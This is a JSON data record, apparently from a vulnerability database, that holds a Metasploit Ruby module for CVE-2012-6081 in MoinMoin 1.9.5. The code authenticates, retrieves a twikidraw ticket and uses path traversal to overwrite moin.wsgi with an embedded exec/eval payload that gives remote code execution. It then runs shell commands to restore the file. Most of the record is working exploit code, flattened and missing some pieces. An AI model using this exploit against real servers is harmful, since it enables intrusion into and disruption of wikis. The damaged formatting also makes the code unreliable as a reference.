{
    "text": "vul_name : MoinMoin twikidraw Action Traversal File Upload ， vul_cve : CVE-2012-6081 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ManualRanking ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => 'MoinMoin twikidraw Action Traversal File Upload' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in MoinMoin 1.9.5. The vulnerability ， exists on the manage of the twikidraw actions , where a traversal path can be used ， in order to upload arbitrary files. Exploitation is achieved on Apached/mod_wsgi ， configurations by overwriting moin.wsgi , which allows to execute arbitrary python ， code , as exploited in the wild on July , 2012. The user is warned to use this module ， at his own risk since it's going to overwrite the moin.wsgi file , required for the ， correct working of the MoinMoin wiki. While the exploit will try to restore the ， attacked application at post exploitation , correct working after all isn't granted. ， } ,  ， 'Author' => ，  [  ， 'Unknown' ,  # Vulnerability discovery ， 'HTP' ,  # PoC ， 'juan vazquez' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2012-6081' ]  ,  ，  [ 'OSVDB' , '88825' ]  ,  ，  [ 'BID' , '57082' ]  ,  ，  [ 'EDB' , '25304' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Privileged' => false ,  # web server context ， 'Payload' => ， { ， 'DisableNops' => true ,  ， 'Space' => 16384 ,  # Enough one to fit any payload ， 'Compat' => ， { ， 'PayloadType' => 'cmd' ,  ， 'RequiredCmd' => 'generic telnet netcat perl' ， } ， } ,  ， 'Platform' => [ 'unix' ]  ,  ， 'Arch' => ARCH_CMD ,  ， 'Targets' => [ 'MoinMoin 1.9.5' , { } ]  ,  ， 'DisclosureDate' => 'Dec 30 2012' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , \"MoinMoin base path\" , \"/\" ]  )  ,  ， OptString.new ( 'WritablePage' ,  [ true , \"MoinMoin Page with edit permissions to inject the payload , by default WikiSandbox ( Ex : /WikiSandbox ) \" , \"/WikiSandBox\" ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ false , \"The user to authenticate as ( anonymous if username not provided ) \" ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ false , \"The password to authenticate with ( anonymous if password not provided ) \" ]  )  ，  ]  , self.class )  ， end ， template = [  ]  ， template \" # - * - coding : iso-8859-1 - * -\" ， template \"import sys , os\" ， template \"sys.path.insert ( 0 , 'PATH' ) \".gsub ( /PATH/ , File.dirname ( path )  ， template \"from MoinMoin.web.serving import make_application\" ， template \"application = make_application ( shared=True ) \" ， end ， first = true ， contents.each { | line |  ， session.shell_command_token ( \"echo \\\" # {line}\\\" > # {file}\" )  ， first = false ， session.shell_command_token ( \"echo \\\" # {line}\\\" # {file}\" )  ， end ， } ， end ，  # Try to restore a basic moin.wsgi file with the hope of making the ，  # application usable again. ，  # Try to search on /usr/local/share/moin ( default search path ) and the ，  # current path ( apache user home ) . Avoiding to search on \"/\" because it ，  # could took long time to finish. ， print_status ( \"Trying to restore moin.wsgi.\" )  ， begin ， files = session.shell_command_token ( \"find `pwd` -name moin.wsgi 2> /dev/null\" )  ， files.split.each { | file |  ， print_status ( \" # {file} found ! Trying to restore.\" )  ， restore_file ( session , file , moinmoin_template ( file )  ， } ， files = session.shell_command_token ( \"find /usr/local/share/moin -name moin.wsgi 2> /dev/null\" )  ， files.split.each { | file |  ， print_status ( \" # {file} found ! Trying to restore.\" )  ， restore_file ( session , file , moinmoin_template ( file )  ， } ， print_warning ( \"Finished. If application isn't usable , manual restore of the moin.wsgi file would be required.\" )  ， rescue ， print_warning ( \"Error while restring moin.wsgi , manual restoring would be required.\" )  ， end ， end ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => normalize_uri (  @ base ,  @ page )  ,  ， 'vars_post' => ， { ， 'action' => 'login' ,  ， 'name' => username ,  ， 'password' => password ,  ， 'login' => 'Login' ， } ， } )  ， end ， end ， vprint_status ( \"Retrieving the ticket.\" )  ， res = send_request_cgi ( { ， 'uri' => normalize_uri (  @ base ,  @ page )  ,  ， 'cookie' => session ,  ， 'vars_get' => { ， 'action' => 'twikidraw' ,  ， 'do' => 'modify' ,  ， 'target' => '././././moin.wsgi' ， } ， } )  ， vprint_error ( \"Error retrieving the ticket\" )  ， end ， ticket = $ 1 ， vprint_good ( \"Ticket found :  # {ticket}\" )  ， my_payload = \" [ MARK ]  # {code} [ MARK ] \" ， post_data = Rex : MIME : Message.new ， post_data.add_part ( \"drawing.r if (  ) else [  ] \\nexec eval ( \\\"open ( _file_ ) \\56read (  ) \\56split ( ' [ MARK ] ' )  [ -2 ] \\56strip ( '\\0' ) \\\" ) \" , nil , nil , \"form-data ; name=\\\"filename\\\" )  ， post_data.add_part ( my_payload , \"image/png\" , nil , \"form-data ; name=\\\"filepath\\\" ; filename=\\\"drawing.png\\\" )  ， my_data = post_data.to_s.gsub ( /^\\r\\n\\-\\-\\_Part\\_/ , '-_Part_' )  ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => normalize_uri (  @ base ,  @ page )  ,  ， 'cookie' => session ,  ， 'vars_get' => ， { ， 'action' => 'twikidraw' ,  ， 'do' => 'save' ,  ， 'ticket' => ticket ,  ， 'target' => '././././moin.wsgi' ， } ,  ， 'data' => my_data ,  ， 'ctype' => \"multipart/form-data ; boundary= # {post_data.bound}\" ， } )  ， vprint_error ( \"Error uploading the payload\" )  ， end ， end ， def check ，  @ base = target_uri.path ，  @ base '/' if @ base [ -1 , 1 ]  ! = '/' ， res = send_request_cgi ( { ， 'uri' => normalize_uri (  @ base )  ， } ) ",
    "time": "2013.06.19"
}